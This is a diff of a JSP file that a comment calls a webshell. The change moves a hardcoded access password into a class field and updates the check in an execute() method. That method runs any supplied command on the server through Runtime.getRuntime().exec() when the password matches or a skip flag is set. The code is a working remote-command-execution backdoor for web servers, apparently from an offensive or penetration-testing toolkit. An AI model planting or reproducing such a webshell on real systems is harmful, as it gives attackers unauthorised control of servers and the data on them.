@@ -3,16 +3,17 @@
 <%@page import="java.io.*"%>
 <%@page import="java.net.*"%>
 <%!
+
+    // =====================================================================
+	// Setup global password necessary to pass before using that webshell.
+	public String HardcodedPassword = "5eQzrXZHZwJNLvm6Q2b7PR6r";
+
+	// =====================================================================
+
 	public String execute(String pass, String cmd, Boolean skip) {
-
-        // ----------------------------------------
-        // CHANGE THIS HARDCODED PASSWORD
-        //
-		final String hardcodedPass = "brhQ5U7OzHdqpnTgKaCo6Zd";
-
 		StringBuilder res = new StringBuilder();
 
-		if (cmd != null && cmd.length() > 0 && ((skip) || (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none")))){
+		if (cmd != null && cmd.length() > 0 && ((skip) || (pass.equals(HardcodedPassword) || HardcodedPassword.toLowerCase().equals("none")))){
 			try {
 				Process proc = Runtime.getRuntime().exec(cmd);
 				OutputStream outs = proc.getOutputStream();
